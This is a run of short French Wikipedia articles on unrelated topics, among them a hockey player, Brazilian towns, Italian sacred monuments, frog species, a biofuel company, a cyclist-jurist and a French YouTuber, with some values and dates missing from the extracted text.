Andy Andreoff débute en 2007 avec les Panthers de Pickering en Ligue de hockey junior de l'Ontario. Il finit la saison 2007-2008 avec les Generals d'Oshawa en LHO, avec lesquels il joue jusqu'en 2012. Il est repêché à la du repêchage d'entrée dans la LNH 2011 par les Kings de Los Angeles. 
Le , il est échangé au Lightning de Tampa Bay contre Peter Budaj.

</doc>
<doc id="9412672" url="https://fr.wikipedia.org/wiki?curid=9412672" title="Montes Claros de Goiás">
Montes Claros de Goiás

Montes Claros de Goiás est une municipalité brésilienne de l'État de Goiás et la microrégion d'Aragarças.

</doc>
<doc id="9412676" url="https://fr.wikipedia.org/wiki?curid=9412676" title="Piranhas (Goiás)">
Piranhas (Goiás)

Piranhas est une municipalité brésilienne de l'État de Goiás et la microrégion d'Aragarças.

</doc>
<doc id="9412682" url="https://fr.wikipedia.org/wiki?curid=9412682" title="Église Saint-Pierre des Essarts">
Église Saint-Pierre des Essarts

L’église Saint-Pierre est un édifice catholique français situé sur la commune déléguée des Essarts, à Essarts-en-Bocage, dans le département de la Vendée, en région Pays-de-la-Loire.
Histoire.
L’actuelle église Saint-Pierre, construite au siècle, est située à l’emplacement même de l’ancien prieuré Saint-Pierre, détruit pendant la guerre de Vendée par les colonnes infernales.
Une croix de procession en argent est blasonnée aux armes de Mademoiselle de Nemours, dame des Essarts, petite-fille du duc de Vendôme.
Ancien lieu de pèlerinage, une crypte du siècle à 3 nefs se trouve sous l’édifice ecclésiastique, où sont dénombrés plusieurs tombeaux. Cette dernière a fait l’objet d’un classement aux monuments historiques, par arrêté du .
Culte.
Appartenant à la commune d’Essarts-en-Bocage, l’église est un lieu de culte catholique.
Du point de vue religieux, elle relève depuis 1997 de la paroisse catholique Sainte-Croix-des-Essarts, située dans le doyenné de Chantonnay, au sein du diocèse de Luçon. Auparavant, Saint-Pierre-des-Essarts, qui reprenait les limites exactes de la commune, était la paroisse à laquelle était attaché le lieu de culte.

</doc>
<doc id="9412685" url="https://fr.wikipedia.org/wiki?curid=9412685" title="Larrodrigo">
Larrodrigo

Larrodrigo est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9412686" url="https://fr.wikipedia.org/wiki?curid=9412686" title="Daizee Haze">
Daizee Haze

Emily Sharp (née le à Cape Girardeau, Missouri) est une catcheuse américaine connue sous le nom de ring de Daizee Haze. Au cours de sa carrière, elle travaille à la , la ainsi qu'à la .
Débuts (2002-...).
Sharp commence sa carrière de catcheuse sous le nom de Daizee Haze dans le Missouri à la le 12 avril 2002 où avec Johnny Greenpeace elle remporte un match par équipe face à Super Castaldi and et Castaldi #4.
Le 22 février 2003, elle participe à l'enregistrement de "" produite par la où elle bat . Elle revient dans cette fédération le 6 puis le 27 juillet où elle perd ses deux matchs : d'abord un match par équipe avec Matt Sydal face à Alexis Laree et Julio DiNero puis un match simple face à Nurse Veronica.
Elle travaille ensuite fréquemment à l' (IWA Mid-South).

</doc>
<doc id="9412692" url="https://fr.wikipedia.org/wiki?curid=9412692" title="Emily Sharp">
Emily Sharp



</doc>
<doc id="9412693" url="https://fr.wikipedia.org/wiki?curid=9412693" title="Langelot en permission">
Langelot en permission

Langelot en permission est le trente-deuxième roman de la série "Langelot", écrite par le Lieutenant X. Ce roman a été édité pour la première fois en 1979, dans la bibliothèque verte.
Résumé.
"Le roman comporte un prologue suivi de 18 chapitres."
Le roman commence par un prologue : sept personnages sont réunis et discutent de diverses affaires. Ce sont les dirigeants du SPHINX, une organisation criminelle internationale. La décision est prise d'éliminer le sous-lieutenant Langelot qui, à plusieurs reprises, avait dans le passé contrecarré les plans du SPHINX. Sidney-la-Gélatine, qui a un compte personnel à régler avec Langelot, propose de s'occuper lui-même de l'opération et de prendre les frais à sa charges.
Langelot est tout heureux d'avoir quinze jours de permission. Il a décidé de se rendre à Marbella, en Espagne, pour profiter du soleil et de la Méditerranée. Son amie Choupette doit venir le rejoindre dans quelques jours, dès que son père, le professeur Roche-Verger, aura fini ses affaires à Rome.
Langelot descend donc à l'hôtel dans lequel il a réservé une chambre. Peu de temps après son arrivée, il a une altercation avec un jeune homme, Edmond. Celui-ci lui ressemble d'ailleurs : blond, pas très grand. Langelot résout l'algarade en envoyant Edmond dans la piscine. Langelot sympathise avec la cousine de celui-ci, Mirabelle.
Le lendemain, Langelot est réveillé au petit matin par Mirabelle : Edmond a disparu ! Langelot découvre que le jeune homme n'a même pas dormi la nuit dans sa chambre, qu'il a volé la Midget bleue de Langelot et qu'il a récupéré un courrier destiné à l’agent secret. En fait, profitant de sa ressemblance, Edmond s'est fait passer pour Langelot ! Néanmoins celui-ci n'est pas inquiet : sa voiture était quasiment à sec, et Edmond a certainement dû tomber en panne d'essence.
Langelot et Mirabelle recherchent donc Edmond. Ils finissent par le trouver : il a été fait prisonnier dans une villa sécurisée. On apprend qu'une jeune femme, Sybil, est entrée en contact avec lui et l’a amenée dans ce lieu. En fait, c'était Langelot qui était visé, et les bandits ont confondu Langelot avec Edmond !
Langelot visite la villa et découvre un flacon de « sérum de vérité ». Il remplace ce produit par de l’eau pure. Puis il demande à Edmond et à Mirabelle de prévenir le SNIF ; il leur donne les coordonnées téléphoniques du service secret. Tandis que les deux cousins quittent la villa, Langelot prend la place d'Edmond.
Dès le lendemain, Langelot est interrogé par le médecin ripoux du SPHINX. Dans la mesure où seule de l'eau pure lui est administrée, Langelot parvient à berner le médecin, puis dans un second temps Sidney-la-Gélatine lui-même. Il fait même croire à ce dernier qu'il était venu en Espagne pour une autre raison qu'un simple séjour touristique : il devait protéger le directeur-général du SNIF qui doit arriver incognito le lendemain à Séville pour rencontrer d'autres directeurs de services secrets occidentaux. Salivant à l'idée qu'il pourrait s'emparer du directeur-général du SNIF, Sidney-la-Gélatine interroge Langelot sur la prétendue réunion. Langelot lui « révèle » qu'elle aura lieu le lendemain à La Giralda de Séville.
La nuit suivante Edmond trouve enfin moyen de communiquer en Morse lumineux avec Langelot. Depuis le soupirail de sa prison, l'agent secret charge le jeune garçon de transmettre au SNIF tous les renseignements relatifs à ce guet-apens.
Le lendemain, Sidney-la-Gélatine, ses hommes de main et Langelot se mettent en route vers Séville. Langelot reconnaît le capitaine Montferrand, qui est fait prisonnier par les hommes de main du bandit. Mais dans l'opération, Langelot est délivré par l’aspirant Gaspard, son collègue du SNIF.
Sidney-la-Gélatine a donc fait prisonnier Montferrand, le prenant pour le directeur-général du SNIF. Le petit groupe du SPHINX se dirige vers les côtes de Méditerranée, afin de rejoindre le sous-marin du SPHINX dirigé par le commodore Burma.
Langelot et ses amis retardent le petit convoi (notamment par l’organisation d'un faux accident routier). Lorsque Sidney-la-Gélatine arrive à bord du sous-marin qui vient d'émerger des flots, il a la surprise de constater qu'il s'agit d'un équipage français et d'un sous-marin français. Il est fait prisonnier, tandis que Montferrand est libéré.
Le roman se termine par une cérémonie officielle au cours de laquelle Mirabelle et Edmond sont remerciés par Montferrand pour leurs actes de bravoure et de dévouement.

</doc>
<doc id="9412695" url="https://fr.wikipedia.org/wiki?curid=9412695" title="Jessica Heafey">
Jessica Heafey

Jessica Heafey est une actrice canadienne.

</doc>
<doc id="9412697" url="https://fr.wikipedia.org/wiki?curid=9412697" title="Mont Sacré d'Arona">
Mont Sacré d'Arona

Le Mont Sacré d'Arona, dédié à Charles Borromée, fait partie des Monts Sacrés (Italie) qui témoignent aux de la religiosité dans le Piémont et en Lombardie.
Histoire et architecture.
Aux alentours de 1610, année de canonisation de Charles Borromée, le père Marco Aurelio Grattarola eut l'idée de construire un Mont Sacré voué à saint Charles au sommet d'une colline d'Arona, sa ville natale. Il voulait ainsi que l'archevêque de Milan soit célébré sur les terres mêmes de sa famille.
La grandeur de la personnalité inspira l'idée d'une statue colossale, visible depuis l'autre côté du Lac Majeur. L'initiative fut approuvée et appuyée par Frédéric Borromée, qui succéda à son cousin comme archevêque de Milan.
L'architecte Francesco Maria Richini fut chargé du projet. Il proposa un projet ambitieux, mais qui ne fut que partiellement réalisé. À partir d'un arc de triomphe, trois sentiers auraient dû être jalonnés de cinq chapelles illustrant la vie et la spiritualité de saint Charles. En Federico Borromeo célébra le commencement de la construction. Un des premiers bâtiments achevé fut l'église à croix grecque, dessiné par Richini. Seulement quelques chapelles furent édifiées. Aujourd'hui seules trois d'entre elles subsistent, mais sans décorations. Pour la réalisation des statues on fit appel aux artistes qui travaillaient à la construction du Mont Sacré de Varallo.
La mort de père Grattarola en 1615, la peste en 1629-1630 et la mort de Frédéric Borromée en 1631 arrêtèrent les travaux. La famille Borromée ne reprit la construction qu'en 1692. Le nouveau projet, conçu par l'architecte Carlo Fontana, était plus modeste que l'original. Le sanctuaire fut complété en 1725 avec la construction de la toiture.
Aujourd'hui au-dessus du maître autel se trouve un tableau de Giulio Cesare Procaccini ; derrière l'autel on a reconstruit la cellule originelle de saint Charles avec les meubles de la Rocca Borromea d'Angera, toute proche. Devant l'église, de l'autre côté de la place, se trouve le "séminaire de saint Charles". Depuis la place, un escalier conduit à une statue colossale de saint Charles. Son dessin est dû à Giovanni Battista Crespi, dit "Il Cerano". La statue, haute de , appelée "le Sancarlone", a été réalisée en 1698. Grâce à sa structure creuse en cuivre forgé, on peut accéder à sa tête grâce à un escalier intérieur. C'est la plus haute statue en métal au monde après la statue de la Liberté.

</doc>
<doc id="9412705" url="https://fr.wikipedia.org/wiki?curid=9412705" title="Contrat de quartier">
Contrat de quartier



</doc>
<doc id="9412710" url="https://fr.wikipedia.org/wiki?curid=9412710" title="Henry Philip Tappan">
Henry Philip Tappan

Henry Philip Tappan, né le dans le village de Rhinebeck dans l'État de New York aux États-Unis et mort le à Vevey en Suisse, est un pasteur, professeur et philosophe américain qui a été le premier président de l'Université du Michigan.
Biographie.
Tout d'abord pasteur au sein de l'Église réformée néerlandaise à Schenectady (État de New York), puis au sein de l'Église congrégationaliste de Pittsfield (Massachusetts), il devient professeur de morale à l'Université de New York de 1832 à 1838.
En 1852, il est élu Président de l'Université du Michigan et devient un pionnier dans la transformation des programmes d'études universitaires aux États-Unis : l'Université de Michigan devient ainsi un exemple à suivre pour l'ensemble des universités de recherche américaines.
En dépit de ses succès, la carrière de Tappan se retrouva entravée par des affrontements de personnalité avec le Conseil des Régents de l'université.
Le , il est remercié et quitte immédiatement les États-Unis pour l'Europe avec sa famille. Il s'installe en Suisse où il meurt en 1881.

</doc>
<doc id="9412717" url="https://fr.wikipedia.org/wiki?curid=9412717" title="Shane Mahan">
Shane Mahan

Shane Patrick Mahan, né en 1964 à Greenville, est un maquilleur, technicien des effets spéciaux et marionnettiste américain.
Il est notamment connu pour son travail sur les films "Terminator" (1984), ' (1991), "Predator" (1987), "Predator 2" (1990), "L'Île du docteur Moreau" (1996), ' (1997), "Iron Man" (2008), "Iron Man 2" (2010), "Iron Man 3" (2013), "Pacific Rim" (2013) ou encore "La Forme de l'eau" (2017).

</doc>
<doc id="9412724" url="https://fr.wikipedia.org/wiki?curid=9412724" title="Diamond Bank">
Diamond Bank

Diamond Bank Plc. est une banque nigériane basée à Lagos. C'est l'une des 25 banques autorisées dans le pays. Elle dispose d'une filiale dans l'UEMOA, Diamond Bank établie au Bénin avec des succursales au Sénégal, Côte d'Ivoire, Togo et une autre filiale au Royaume-Uni. En décembre 2012, le total des actifs a été évalué à plus de US.
En juin 2013, la banque disposait de 240 agences au Nigeria, 20 agences au Bénin, 2 agences au Sénégal, 1 agence au Togo et 3 agences en Côte d'Ivoire.
Historique.
Diamond Bank a commencé ses activités le 21 mars 1991 sous le statut d'une Société A Responsabilité Limitée (l'entreprise a été créée le 20 décembre 1990). En février 2001 soit 10 ans plus tard, elle est devenue une banque universelle.
En janvier 2005, à la suite d'une offre privée d'investissement en actions très fructueuse qui a augmenté le capital de la banque, Diamond Bank est devenue une Société Anonyme. En mai 2005, la banque fut cotée à la bourse du Nigeria. Par ailleurs, en janvier 2008, les certificats de titre en dépôt de Diamond Bank furent cotés sur le Marché des Valeurs Professionnelles de la Bourse de Londres London Stock Exchange. C'est la première banque en Afrique à y être côté.
En mars 2019, Access Bank annonce l'acquisition de Diamond Bank pour 235 millions de dollars, créant un nouvel ensemble avec 29 millions de clients.
Filiales et succursales.
Ayant son siège à Lagos, Nigéria, Diamond Bank gère plusieurs filiales, sauf indication contraire :

</doc>
<doc id="9412730" url="https://fr.wikipedia.org/wiki?curid=9412730" title="Rhombophryne longicrus">
Rhombophryne longicrus

Rhombophryne longicrus est une espèce d'amphibiens de la famille des Microhylidae.
Répartition.
Cette espèce est endémique du Nord de Madagascar.
Description.
Le spécimen adulte mâle observé lors de la description originale mesure de longueur standard et le spécimen adulte femelle observé lors de la description originale mesure de longueur standard.
Étymologie.
Le nom spécifique "longicrus" vient du latin ', long, et de ', la jambe, en référence aux inhabituelles longues jambes de cette espèce.

</doc>
<doc id="9412731" url="https://fr.wikipedia.org/wiki?curid=9412731" title="Rhombophryne matavy">
Rhombophryne matavy



</doc>
<doc id="9412732" url="https://fr.wikipedia.org/wiki?curid=9412732" title="Clay Pinney">
Clay Pinney

Clay Pinney, né le et mort le , est un technicien des effets spéciaux américain.
Il est notamment connu pour son travail sur les films "Backdraft" (1991) et "Independence Day" (1996). Pour ce dernier, il a reçu l'Oscar des meilleurs effets visuels lors de la des Oscars. Il a également reçu un lors de la des Oscars.

</doc>
<doc id="9412743" url="https://fr.wikipedia.org/wiki?curid=9412743" title="If you love me...">
If you love me...



</doc>
<doc id="9412748" url="https://fr.wikipedia.org/wiki?curid=9412748" title="Nazar Lahodych">
Nazar Lahodych

Nazar Lahodych - en ukrainien : Назар Лагодич et en anglais : "Nazar Lagodich" - né le à Jovkva est un .
Biographie.
Nazar Lahodych naît le à Jovkva en Ukraine.
Il commence le cyclisme à l'âge de 10 ans. Il s'illustre dans les catégories de jeunes où il obtient de très nombreux titres nationaux sur piste comme sur route. 
En 2013, il termine 12e de l'épreuve chronométrée du Festival Olympique de la Jeunesse Européenne à Utrecht (Pays-Bas). Il termine également 37e de la course en ligne. 
En 2014, il est champion d'Ukraine de poursuite individuelle Juniors. Il monte également sur la troisième marche du podium lors du championnat d'Ukraine du contre-la-montre Juniors. Cette même année, il termine deuxième du contre-la-montre par équipes de la Coupe du Président de la ville de Grudziadz en Pologne. 
Il remporte en 2015 le championnat d'Ukraine du contre-la-montre juniors et termine cinquième de la course en ligne. Sélectionné en équipe d'Ukraine, il se classe huitième du championnat d'Europe du contre-la-montre juniors à Tartu en Estonie. Il termine l'année à la première place du classement de la Fédération ukrainienne de cyclisme chez les juniors.
En fin de saison, pour sa première apparition en France, il remporte le Chrono des Nations-Les Herbiers-Vendée Juniors.
Il intègre le Vélo-Club La Pomme Marseille pour la saison 2016. Il remporte deux étapes du GP des Mutuelles de Sisteron et termine 2e du chrono de Besse-sur-Issole et 3e du chrono de La Gaude. En fin de saison, il participe au Championnat du Monde du contre-la-montre Espoirs à Doha au Qatar, où il se classe . 
Il s'engage avec la formation Martigues SC-Drag Bicycles pour la saison 2017. Il remporte en début de saison le Grand Prix de Néoules et le Grand Prix de Cavalaire.

</doc>
<doc id="9412752" url="https://fr.wikipedia.org/wiki?curid=9412752" title="Liste des noms vernaculaires de raies">
Liste des noms vernaculaires de raies

Cette liste répertorie les noms vernaculaires ou les noms vulgaires de raie.
Cette liste comprend deux parties, la première liste les espèces de raie proprement dits. La seconde partie liste des espèces quelques fois apparentées à celle du premier groupe et dont le nom vernaculaire comporte le mot « raie ».
Liste des noms vernaculaires des espèces de raies.
Liste alphabétique de noms vernaculaires attestés en français. 
"Note : certaines espèces ont plusieurs noms et, les classifications évoluant encore, certains noms scientifiques ont peut-être un autre synonyme valide".

</doc>
<doc id="9412755" url="https://fr.wikipedia.org/wiki?curid=9412755" title="Haune">
Haune

La est une rivière allemande d'une longueur de qui coule dans le land de la Hesse. Elle est un affluent de la Fulda et donc un sous-affluent de la Weser.

</doc>
<doc id="9412756" url="https://fr.wikipedia.org/wiki?curid=9412756" title="Tappan">
Tappan



</doc>
<doc id="9412757" url="https://fr.wikipedia.org/wiki?curid=9412757" title="Bryophryne bakersfield">
Bryophryne bakersfield

Bryophryne bakersfield est une espèce d'amphibiens de la famille des Craugastoridae.
Répartition.
Cette espèce est endémique de la région de Cuzco au Pérou. Elle se rencontre entre et d'altitude.

</doc>
<doc id="9412759" url="https://fr.wikipedia.org/wiki?curid=9412759" title="Gare de Penne (Lot-et-Garonne)">
Gare de Penne (Lot-et-Garonne)



</doc>
<doc id="9412761" url="https://fr.wikipedia.org/wiki?curid=9412761" title="Ermitage Saint-Pierre de Leneyrac">
Ermitage Saint-Pierre de Leneyrac



</doc>
<doc id="9412766" url="https://fr.wikipedia.org/wiki?curid=9412766" title="Richard Hickock">
Richard Hickock

Richard Eugene « Dick » Hickock, né le à Kansas City et mort le à Lansing, est, avec Perry Smith, l'un des deux ex-détenus condamnés pour le meurtre de quatre personnes de la famille Clutter à Holcomb le . Ce crime a été rendu célèbre par Truman Capote dans son roman "De sang-froid" (1966).
Biographie.
En 1950 il a eu un grave accident de la route et, par conséquent, était défiguré avec son visage et ses yeux rendus asymétriques. Hickock a été emprisonné pour la première fois en 1958, à l’âge de 26 ans. Il purgeait sa peine à la prison en Kansas pour le vol d’un fusil. À l’âge de 19 ans il s’est marié pour la première fois. Il a eu une aventure extraconjugale et c'est sa maîtresse qui a donné naissance à son premier enfant. Puis il a divorcé avec sa femme pour épouser sa maîtresse. Ensemble, ils ont eu deux enfants. Sa deuxième femme a demandé le divorce quand il purgeait sa peine en prison en 1958. C'est l'époque à laquelle il rencontre Perry Smith. En prison il a aussi rencontré Floyd Wells, un prisonnier qui travaillait pour la famille Clutter auparavant.

</doc>
<doc id="9412767" url="https://fr.wikipedia.org/wiki?curid=9412767" title="Wahat">
Wahat

Wāḥāt (الواحات) est un mot arabe - au pluriel - désignant "les oasis", qui apparait dans plusieurs toponymes, dont :

</doc>
<doc id="9412785" url="https://fr.wikipedia.org/wiki?curid=9412785" title="Shannon Hale">
Shannon Hale

Shannon Hale, née le à Salt Lake City en Utah, est une autrice américaine de littérature d'enfance et de jeunesse et de fantasy.
Biographie.
Shannon Hale est née Shannon Bryner. Elle a trois sœurs et un frère. Comme enfant, elle aimait lire et écrire. Elle obtient un diplôme de l'université de l'Utah.
Œuvres.
Série "Rapunzel's Revenge".
Cette série est coécrite avec Dean Hale et illustrée par Nathan Hale.
Série "La Princesse masquée".
Cette série est coécrite avec Dean Hale et illustrée par Leuyen Pham.
Série "Animal Tatoo".
Chaque volume de cette série est écrit par un écrivain différent. Les auteurs des autres volumes sont : Brandon Mull (tome 1), Maggie Stiefvater (tome 2), Garth Nix et Sean Williams (tome 3), Tui Sutherland (tome 5), Eliot Schrefer (tome 6) et Marie Lu (tome 7).

</doc>
<doc id="9412788" url="https://fr.wikipedia.org/wiki?curid=9412788" title="Global Bioenergies">
Global Bioenergies

Global Bioenergies est une entreprise française produisant des hydrocarbures légers à partir de produits issus de l'agriculture, par des méthodes biologiques.
Histoire.
L'entreprise est fondée en 2008 par Marc Delcourt et Philippe Marlière.
Le pilote industriel est en activité depuis , l'entreprise annonce une production d'une tonne de bioisobutène pour de sucres.
Global Bioenergies a développé un procédé qui permet l’utilisation de biomasse de première ou de seconde génération : la première génération entre en concurrence directe avec la chaîne alimentaire (maïs, betterave, colza...) tandis que la seconde utilise les matières cellulosiques comme le bois, les feuilles, les tiges des plantes, etc. Cette dernière a été développée grâce à un consortium européen qui a permis, notamment autour de Fibenol, l’extraction à partir des végétaux de sucre de bouleau.
En 2023, l'État, via BPIFrance, accorde à Global Bioenergies une subvention de 16,4 millions d'euros (dont 40% remboursables) afin de financer la première usine au monde d’isobutène biosourcé. Elle devrait entrer en activité en 2027.
En juillet 2024, Global Bioenergies fait part d’une évolution importante à la demande d’acteurs industriels : la production de e-SAF avec un taux de sélectivité record de 95 % par rapport aux autres technologies.
Il s’agit d’une approche complémentaire à la technologie SAF, déjà certifiée par l’ASTM en 2023, substituant à la ressource végétale une ressource synthétique.
Désormais, Global Bioenergies se tourne vers 2030 : les objectifs européens en matière de biocarburants font que la production doit absolument se développer fortement. L’utilisation des huiles de friture transformées en biocarburant ne suffira pas en raison de la faible ressource disponible. La société devient donc une source potentielle de SAF par deux procédés différents : le BioSAF et le eSAF. Le premier procédé utilise les sucres à partir de la biomasse de première ou deuxième génération. Le second utilise l’acide acétique produit à partir de CO2 et d’hydrogène vert grâce à l’électricité décarbonée.
Ainsi, toutes les zones géographiques du monde peuvent être couvertes : 
- les zones à forte densité industrielle via la récupération du CO2 comme l’Europe ou l’Asie, 
- les zones dans lesquelles la biomasse peut être utilisée sans restrictions comme les États-Unis ou le Brésil (en Europe, ce n’est pas le cas) 
- et les zones géographiques européennes où les déchets végétaux peuvent générer des sucres après transformation comme par exemple l’Estonie grâce au procédé mis au point par Global Bioenergies et Fibenol entre autres.
À noter après un contrat de recherche signé avec Shell en novembre 2022 portant sur des carburants routiers renouvelables, Shell et Global Bioenergies viennent de signer une extension au contrat initial pour approfondir les résultats identifiés et lancer le développement de solutions innovantes.
Implantations.
Implantée dans le Génopole d'Évry, Global Bioenergies a effectué ses essais à l'échelle industrielle dans le pilote Bio-Démo d'ARD (Agro-industrie Recherche et Développement) à Pomacle-Bazancourt. Un pilote a été construit à la raffinerie de Leuna (Allemagne) pour démarrer courant 2016. De plus, Global Bioenergies a fondé une coentreprise (IBN-One) avec Cristal Union pour installer une usine en France, qui devait être fonctionnelle en 2018. Le budget des travaux prévus s'élevaient à , pour un chantier commençant en 2017.
Le site de Leuna a été fermé pour rapatrier la production à Pomacle : la production se fait grâce à des sous-traitants. De l’isobutène (IBN) a ainsi été produit, ce qui valide ce démonstrateur d’une part et a permis la vente d’autre part.
De cette façon, l’IBN a été transformé en isododécane pour les besoins de la cosmétique et vendu en tant que produit biosourcé indispensable pour leur image de naturalité aux acteurs de la cosmétique pour évaluation. D’autre part le produit a permis d’obtenir la certification ASTM, précieux sésame qui permet d’utiliser l’IBN comme additif dans le carburant des avions de ligne existants et ce en quantité potentiellement importante : jusqu’à 50 % en substitution du kérosène fossile.
L'Europe vient de se doter du plan RefuelEU qui vise à augmenter progressivement la production et l’incorporation obligatoire de SAF, de 2% en 2025 à 6% en 2030 et jusqu’à 70% d’ici à 2050.
Cela rend le procédé de Global Bioenergies d’autant plus intéressant dans le contexte actuel. En effet, l'IBN ainsi produit (ce n'est pas vrai de tous les modes de production) décarbone ainsi fortement la circulation aérienne ce qui agit en complément de l'amélioration des moteurs et de la modération des usages.
À noter que fin qu’en avril 2024, la société a été certifiée iso 9001 et qu'elle est devenue membre du prestigieux GiFAS après avoir été sélectionnée par un jury d’experts en juillet 2024.
Produits.
Le premier procédé développé a été la production de méthylpropène (également appelé isobutène ou isobutylène) à partir de glucose, mise au point en 2010. Les bactéries effectuant la transformation sont équipées d'un matériel enzymatique artificiel développé par génie génétique. Ce produit est reconnu comme biocarburant en France en 2018.
Ensuite, Global Bioenergies a noué un partenariat avec Audi pour développer la production d'essence à partir des mêmes briques élémentaires que les végétaux (eau, hydrogène, dioxyde de carbone et lumière du jour).
Global Bioenergies produit ainsi et surtout désormais de l’isobutène par un procédé unique au monde de fermentation qui utilise peu d’énergie contrairement aux procédés habituels Fischer Tropsch.
L'isobutène peut être transformé en isododécane utilisé en cosmétique.

</doc>
<doc id="9412792" url="https://fr.wikipedia.org/wiki?curid=9412792" title="Molly Shaffer Van Houweling">
Molly Shaffer Van Houweling

Molly Shaffer Van Houweling, née le , est une juriste et coureuse cycliste américaine. Spécialiste du contre-la-montre, elle bat du record du monde de l'heure le , avec parcourus en une heure. Son record est battu le par l'Australienne Bridie O'Donnell en .
Activités d'avocate.
Molly Shaffer Van Houweling étudie le droit au sein de la Faculté de droit de l'Université Harvard. Elle travaille au cours de ses études comme éditrice pour le "Harvard Journal of Law and Technology" et au sein du Berkman Center for Internet &amp; Society. En outre, elle est assistante de recherche pour Arthur R. Miller et Lawrence Lessig et enseigne au "Harvard College Government Department". Pendant ce temps, elle obtient pour la qualité de son enseignement le "Derek Bok Award for Excellence in Undergraduate Education". En 2002, elle fait partie de l'équipe fondatrice de Creative Commons, dont elle devient la présidente. Elle suit d'autres études en sciences politiques à l'Université du Michigan, qu'elle compléte avec un mémoire intitulé "The Politics of Presidential Position-Taking ". Elle est également parmi les premiers employés de l'Internet Corporation for Assigned Names and Numbers (l'ICANN).
Depuis 2005, Shaffer Van Houweling est professeur de droit au sein de Berkeley Law, la faculté de droit de l'université de Californie à Berkeley. Elle occupe le poste de co-directeur de la faculté. Elle travaille également pour le juge Michael Boudin de la Cour d'appel, ainsi que le juge David Souter de la Cour suprême des États-Unis. Ses axes de recherche sont les dispositions du droit d'auteur liés aux nouvelles technologies de l'information. L'accent est mis sur les bases juridiques, qui sont destinées à réguler les intérêts commerciaux, mais également les intérêts des utilisateurs privés.
Cyclisme.
En plus de ses activités scientifiques, Molly Shaffer Van Houweling - ainsi que son mari, le politologue Robert Van Houweling - pratique le cyclisme. En 2004, le couple devient champion du Michigan sur un tandem. En 2011, Molly Van Houweling est huitième du championnat américain du contre-la-montre. Un an plus tard, elle se classe à la douzième place, puis à la onzième place en 2013. Toujours en 2013, elle se classe seizième du Chrono des Herbiers. En 2011, elle est championne du monde du contre-la-montre dans la catégorie des Masters et vice-championne du monde dans la course en ligne. En 2012 et 2014, elle est double championne du monde Masters.
En , elle établit avec par heure, un nouveau record de l'heure des États-Unis et du continent panaméricain au Velodromo Bicentenario d'Aguascalientes (Mexique). Le , elle bat le record du monde de l'heure datant de douze ans et détenu par la multiple championne du monde et championne olympique, la Néerlandaise Leontien van Moorsel. Elle porte le record de à . L'Australienne Bridie O'Donnell améliore le record le en 
En , elle devient championne des États-Unis de poursuite pat équipes, avec Christina Birch, Catherine Moore et Amanda Seigle.

</doc>
<doc id="9412799" url="https://fr.wikipedia.org/wiki?curid=9412799" title="Lansing (Kansas)">
Lansing (Kansas)

Lansing est une ville du comté de Leavenworth au Kansas.

</doc>
<doc id="9412803" url="https://fr.wikipedia.org/wiki?curid=9412803" title="Colosse de Saint Charles Borromée">
Colosse de Saint Charles Borromée

Le Colosse de Saint Charles Borromée (dit aussi Sancarlone) est une statue de plus de de hauteur située à Arona (Italie), sur le Mont Sacré d'Arona dédié à saint Charles Borromée.
Saint Charles.
Saint Charles Borromée naquit le dans la Rocca di Arona (détruite lors des campagnes militaires de Napoléon Bonaparte). Il devint évêque et cardinal à 22 ans et fut élu archevêque de Milan en 1565. Il mourut le , fut béatifié en 1602 et canonisé en 1610.
Construction de la statue.
Sur la volonté de son cousin Federico, archevêque de Milan depuis la mort de Charles en 1624, on commença la construction d'un Mont Sacré pour célébrer la mémoire et les œuvres de saint Charles.
Federico Borromeo et Marco Aurelio Grattarola, le superviseur des travaux du Mont Sacré, voulurent construire une grande statue qui soit visible depuis le lac Majeur.
Giovanni Battista Crespi, dit "Il Cerano", dessina la statue qui fut réalisée en cuivre et façonnée par les sculpteurs Siro Zanella de Pavia et Bernardo Falconi de Bissone. A cette occasion, ils employèrent pour la première fois la technique de plaques de cuivre repoussé installées sur une structure porteuse rigide. Bartholdi s'inspirera de cette technique pour réaliser la statue de la Liberté.
L'œuvre fut terminée en 1698 et le le cardinal Federico Caccia, archevêque de Milan, bénit le monument.

</doc>
<doc id="9412807" url="https://fr.wikipedia.org/wiki?curid=9412807" title="Holcomb (Kansas)">
Holcomb (Kansas)

Holcomb est une ville du comté de Finney au Kansas.
Dans les arts et la culture populaire.
Littérature.
Roman.
L'histoire du "De sang froid" de Truman Capote se déroule aux alentours de Holcomb.

</doc>
<doc id="9412809" url="https://fr.wikipedia.org/wiki?curid=9412809" title="L-29">
L-29



</doc>
<doc id="9412812" url="https://fr.wikipedia.org/wiki?curid=9412812" title="Soukhoï 24">
Soukhoï 24



</doc>
<doc id="9412815" url="https://fr.wikipedia.org/wiki?curid=9412815" title="Sanctuaire Madonna de la Bocciola">
Sanctuaire Madonna de la Bocciola

Le sanctuaire Madonna de la Bocciola se trouve dans la commune d'Ameno, province de Novare, en Italie.
Ce sanctuaire s’élève là où la tradition dit qu'il y eut un miracle : en 1543 la Vierge apparaît à un jeune bergère, Giulia Manfredi, en lui disant qu'elle protègerait le village si les habitants lui consacrent le samedi après-midi et le dimanche.
L'église évolua jusqu'à l'actuelle structure moderne néo-classique

</doc>
<doc id="9412820" url="https://fr.wikipedia.org/wiki?curid=9412820" title="John B. Coulter">
John B. Coulter

John Breitling Coulter est un lieutenant général de l'United States Army.

</doc>
<doc id="9412822" url="https://fr.wikipedia.org/wiki?curid=9412822" title="Antoine Daniel">
Antoine Daniel

Antoine Daniel, né le à Enghien-les-Bains, est un streameur et vidéaste web français. Il est notamment connu pour avoir créé l'émission humoristique "What The Cut !?", qu'il présente et réalise du au sur YouTube.
Depuis 2018, il est principalement actif sur la plateforme Twitch, sur laquelle il rassemble, en , . Sa chaîne YouTube principale, devenue inactive, compte encore près de d'abonnés.
Biographie.
Jeunesse et études.
Antoine Daniel est né le à Enghien-les-Bains, dans le Val-d'Oise.
Avec des amis, il réalise beaucoup de contenus très différents, comme des fictions audios ou écrites, des vidéos, de l'animation, qu'ils dispersent sur différents sites internet. Il tient avec des amis un site internet "Le paon qui gueule" durant les années 2007 et 2008, qui répertoriait principalement des vidéos aléatoires. 
Il commence ses études supérieures à l'ESRA de Paris, où il étudie pendant deux ans avant d'arrêter. Il étudie ensuite à Cifacom, où il fait un BTS « Métiers de l'audiovisuel », option métiers du son. Une fois son BTS en poche, il trouve un travail temporaire d'opérateur de saisie dans une entreprise d'édition musicale qui ne lui plaît guère.
Inspirations et figures marquantes.
